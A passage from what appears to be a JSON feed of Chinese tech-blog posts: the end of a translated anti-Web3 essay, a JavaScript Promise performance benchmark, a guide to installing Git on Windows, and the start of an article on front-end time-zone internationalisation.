href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-built_in\">Promise</span>.all(userIds.map(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> fetch(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) </span>{  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> fibonacciSequence()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\r\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 